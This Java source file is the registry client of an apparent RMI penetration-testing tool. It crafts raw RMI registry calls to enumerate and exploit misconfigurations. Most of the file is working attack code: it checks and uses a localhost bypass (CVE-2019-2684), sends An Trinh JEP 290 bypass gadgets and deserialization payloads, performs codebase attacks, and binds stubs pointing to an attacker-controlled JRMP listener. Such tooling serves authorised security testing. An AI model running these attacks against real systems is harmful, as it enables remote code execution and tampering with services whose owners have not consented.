package de.qtc.rmg.operations;

import java.rmi.server.ObjID;

import javax.management.remote.rmi.RMIServerImpl_Stub;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.YsoIntegration;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


/**
 * The RegistryClient class provides different methods to communicate with an RMI registry. The supported RMI
 * calls are dispatched manually, which allows modifications on the call level. The RMI target is taken from the
 * supplied RMIWhisperer, which allows to skip all the TLS and host redirection stuff.
 *
 * @author Tobias Neitzel (@qtc_de)
 */

@SuppressWarnings("restriction")
public class RegistryClient {

    private RMIWhisperer rmi;

    private static final long interfaceHash = 4905912898345647071L;
    private static final ObjID objID = new ObjID(ObjID.REGISTRY_ID);

    /**
     * Initializes the class and makes some required fields accessible by using reflection. These fields are
     * actually only required by some of the provided functions and the reflection is contained within the constructor
     * for legacy reasons. However, it shouldn't hurt.
     *
     * @param rmiRegistry RMIWhisperer object that represents the targeted RMI registry
     */
    public RegistryClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;
    }

    public void bindObject(String boundName, String host, int port, boolean localhostBypass)
    {
        Logger.printMixedBlue("Binding name", boundName, "to TCPEndpoint ");
        Logger.printlnPlainBlue(host + ":" + port);
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        try {
            payloadObject = prepareRMIServerImpl(host, port);

        } catch(Exception e) {
            ExceptionHandler.internalException(e, "RegistryClient.bindObject", true);
        }

        try {
            registryCall("bind", new Object[] {boundName, payloadObject}, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during bind call.");
            Logger.printlnMixedYellow("Bind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "bind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "bind");

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Bind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else if( t instanceof java.rmi.AlreadyBoundException) {
                ExceptionHandler.alreadyBoundException(e, boundName);

            } else {
                ExceptionHandler.unexpectedException(e, "bind", "call", false);
            }

        } catch( java.rmi.AlreadyBoundException e ) {
            ExceptionHandler.alreadyBoundException(e, boundName);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "bind", "call", false);
        }
    }

    public void rebindObject(String boundName, String host, int port, boolean localhostBypass)
    {
        Logger.printMixedBlue("Rebinding name", boundName, "to TCPEndpoint ");
        Logger.printlnPlainBlue(host + ":" + port);
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        try {
            payloadObject = prepareRMIServerImpl(host, port);

        } catch(Exception e) {
            ExceptionHandler.internalException(e, "RegistryClient.rebindObject", true);
        }

        try {
            registryCall("rebind", new Object[] {boundName, payloadObject}, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during rebind call.");
            Logger.printlnMixedYellow("Rebind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "rebind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "rebind");

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Rebind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else {
                ExceptionHandler.unexpectedException(e, "rebind", "call", false);
            }

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "rebind", "call", false);
        }
    }

    public void unbindObject(String boundName, boolean localhostBypass)
    {
        Logger.printlnMixedBlue("Ubinding bound name", boundName, "from the registry.");
        Logger.println("");
        Logger.increaseIndent();

        try {
            registryCall("unbind", new Object[] {boundName}, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during unbind call.");
            Logger.printlnMixedYellow("Unbind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "unbind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "unbind");

            } else {
                ExceptionHandler.unexpectedException(e, "unbind", "call", false);
            }

        } catch( java.rmi.NotBoundException e ) {
            Logger.eprintlnMixedYellow("Caught", "NotBoundException", "during unbind call.");
            Logger.printlnMixedBlue("The name", boundName, "seems not to be bound to the registry.");

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "unbind", "call", false);
        }
    }

    /**
     * Invokes the .lookup(String name) method of the RMI registry with a malformed codebase address and an
     * Integer as argument. Registry servers that use readObject() for unmarshalling the String type and that
     * are configured with useCodebaseOnly=false will attempt to parse the provided codebase as URL and throw
     * an according exception. With useCodebaseOnly=true, the malformed codebase is read too, but ignored afterwards.
     * This allows to detect whether the server runs with useCodebaseOnly=false.
     *
     * @param marshal  indicates whether the registry server uses readObject() to unmarshall Strings (true)
     * @param regMethod  the registry method to use for the operation (lookup|bind|rebind|unbind)
     */
    public void enumCodebase(boolean marshal, String regMethod, boolean localhostBypass)
    {
        Logger.printlnBlue("RMI server useCodebaseOnly enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        if(!marshal && regMethod == "lookup") {
            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
            Logger.eprintlnMixedBlue("  This prevents", "useCodebaseOnly", "enumeration from remote.");
            Logger.decreaseIndent();
            return;
        }

        MaliciousOutputStream.setDefaultLocation("InvalidURL");

        try {

            registryCall(regMethod, packArgsByName(regMethod, 0), true, localhostBypass);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.net.MalformedURLException ) {
                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + regMethod + " call.");
                Logger.printMixedBlue("  --> The server", "attempted to parse", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                Logger.statusNonDefault();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.lang.ClassCastException ) {
                Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
                Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=true).");
                Logger.statusDefault();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("Unable to enumerate useCodebaseOnly by using", regMethod, "call.");
                ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
            Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
            Logger.printlnPlainYellow("(useCodebaseOnly=true).");
            Logger.statusDefault();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    /**
     * Determines how the String type is umarshalled by the remote server. Sends a java.lang.Integer as argument
     * for the lookup(String name) call. If the String type is read via readObject(), this will lead to an deserialization
     * attempt of the location, which is set to an unknown object (DefinitelyNonExistingClass). If this class name
     * appears in the server exception, we know that readObject() was used. The readString() method, on the other hand,
     * ignores the location of an object.
     */
    public boolean enumerateStringMarshalling()
    {
        boolean marshal = false;

        Logger.printlnBlue("RMI server String unmarshalling enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        try {
            registryCall("lookup", new Object[] {0}, true, false);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);
            if( t instanceof ClassNotFoundException && t.getMessage().contains("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                Logger.printlnMixedYellow("- Server", "attempted to deserialize", "object locations during lookup call.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readObject().");
                Logger.statusOutdated();
                ExceptionHandler.showStackTrace(e);
                marshal = true;

            } else if( t instanceof ClassCastException && t.getMessage().contains("Cannot cast an object to java.lang.String")) {
                Logger.printlnMixedYellow("- Server complained that", "object cannot be casted to java.lang.String.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readString().");
                Logger.statusDefault();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.io.InvalidClassException ) {
                Logger.printMixedBlue("- Server rejected deserialization of", "java.lang.Integer");
                Logger.printlnPlainYellow(" (SingleEntryRegistry?).");
                Logger.println("  --> Unable to detect String marshalling on this registry type.");
                Logger.statusUndecided("Configuration");
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
            }

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "lookup", "call", false);

        } finally {
            Logger.decreaseIndent();
        }

        return marshal;
    }

    public void enumLocalhostBypass()
    {
        Logger.printlnBlue("RMI registry localhost bypass enumeration (CVE-2019-2684):");
        Logger.println("");
        Logger.increaseIndent();

        Object[] payload = new Object[] {"If this name exists on the registry, it is definitely the maintainers fault..."};

        try {
            registryCall("unbind", payload, false, true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("- Registry", "rejected unbind call", "cause it was not send from localhost.");
                Logger.statusOk();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "unbind");

            } else {
                ExceptionHandler.unexpectedException(e, "unbind", "call", false);
            }

        } catch( java.rmi.NotBoundException e ) {
            Logger.printMixedYellow("- Caught", "NotBoundException", "during unbind call ");
            Logger.printlnPlainBlue("(unbind was accepeted).");
            Logger.statusVulnerable();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "unbind", "call", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    public void enumJEP290Bypass(String regMethod, boolean localhostBypass, boolean marshal)
    {
        Logger.printlnBlue("RMI registry JEP290 bypass enmeration:");
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        if(!marshal && regMethod == "lookup") {
            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
            Logger.eprintlnMixedBlue("  This prevents", "JEP 290 bypass", "enumeration from remote.");
            Logger.decreaseIndent();
            return;
        }

        try {
            payloadObject = YsoIntegration.prepareAnTrinhGadget("127.0.0.1", 1234567);
        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "pyload", "creation", true);
        }

        try {
            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, regMethod);

            } else if( t instanceof java.rmi.RemoteException ) {
                Logger.printMixedYellow("- Caught", "RemoteException", "after sending An Trinh gadget ");
                Logger.printlnPlainYellow("(An Trinh bypass patched).");
                ExceptionHandler.showStackTrace(e);
                Logger.statusOk();

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.IllegalArgumentException e ) {
            Logger.printlnMixedYellow("- Caught", "IllegalArgumentException", "after sending An Trinh gadget.");
            Logger.statusVulnerable();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    public void gadgetCall(Object payloadObject, String regMethod, boolean localhostBypass)
    {
        Logger.printGadgetCallIntro("RMI Registry");

        try {

            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.jep290(e);

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                ExceptionHandler.deserializeClassNotFound(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.deserlializeClassCast(e, regMethod.equals("lookup"));

            } else if( cause instanceof java.rmi.RemoteException && cause.getMessage().contains("Method is not Remote")) {
                Logger.printlnMixedYellow("Caught", "RemoteException", "during deserialization attack.");
                Logger.printMixedBlue("This is expected when", "An Trinh bypass", "was used and the server ");
                Logger.printlnPlainYellow("is patched.");

            } else {
                ExceptionHandler.unknownDeserializationException(e);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, regMethod.equals("lookup"));

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);
        }
    }

    public void codebaseCall(Object payloadObject, String regMethod, boolean localhostBypass)
    {
        String className = payloadObject.getClass().getName();
        Logger.printCodebaseAttackIntro("RMI Registry", regMethod, className);

        try {
            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "Registry", className);
                Logger.eprintlnMixedBlue("Make sure your payload class", "extends RemoteObject", "and try again.");
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                ExceptionHandler.unsupportedClassVersion(e, regMethod, "call");

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
                ExceptionHandler.codebaseSecurityManager(e);

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
                ExceptionHandler.codebaseClassNotFound(e, className);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.codebaseClassCast(e, regMethod.equals("lookup"));

            } else if( cause instanceof java.security.AccessControlException) {
                ExceptionHandler.accessControl(e, regMethod, "call");

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, regMethod.equals("lookup"));

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);
        }
    }

    private void registryCall(String callName, Object[] callArguments, boolean maliciousStream, boolean bypass) throws Exception
    {
        if(bypass)
            rmi.genericCall(objID, -1, getHashByName(callName), callArguments, maliciousStream, callName);
        else
            rmi.genericCall(objID, getCallByName(callName), interfaceHash, callArguments, maliciousStream, callName);
    }

    private int getCallByName(String callName)
    {
        switch(callName) {
            case "bind":
                return 0;
            case "list":
                return 1;
            case "lookup":
                return 2;
            case "rebind":
                return 3;
            case "unbind":
                return 4;
            default:
                ExceptionHandler.internalError("RegistryClient.getCallIDByName", "Unable to find callID for method '" + callName + "'.");
        }

        return 0;
    }

    private long getHashByName(String callName)
    {
        switch(callName) {
            case "bind":
                return 7583982177005850366L;
            case "list":
                return 2571371476350237748L;
            case "lookup":
                return -7538657168040752697L;
            case "rebind":
                return -8381844669958460146L;
            case "unbind":
                return 7305022919901907578L;
            default:
                ExceptionHandler.internalError("RegistryClient.getMethodHashByName", "Unable to find method hash for method '" + callName + "'.");
        }

        return 0L;
    }

    private Object[] packArgsByName(String callName, Object payloadObject)
    {
        switch(callName) {
            case "bind":
                return new Object[] {"rmg", payloadObject};
            case "list":
                return new Object[] {};
            case "lookup":
                return new Object[] {payloadObject};
            case "rebind":
                return new Object[] {"rmg", payloadObject};
            case "unbind":
                return new Object[] {payloadObject};
            default:
                ExceptionHandler.internalError("RegistryClient.packArgsByName", "Unable to find pack strategie for method '" + callName + "'.");
        }

        return null;
    }

    /**
     * Generates an RMIServerImpl_Stub as it is usually used by JMX instances. The contained TCPEndpoint
     * points to a user controlled address. This can be used for binding a malicious bound name to the
     * RMI registry. Once it is looked up, a JRMP connection is created to the specified TCPEndpoint.
     *
     * @param host  listener host for the outgoing JRMP connection
     * @param port  listener port for the outgoing JRMP connection
     * @return   RMIServerImpl_Stub as used by JMX
     * @throws Exception
     */
    private Object prepareRMIServerImpl(String host, int port) throws Exception
    {
        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));
        return new RMIServerImpl_Stub(refObject);
    }
}
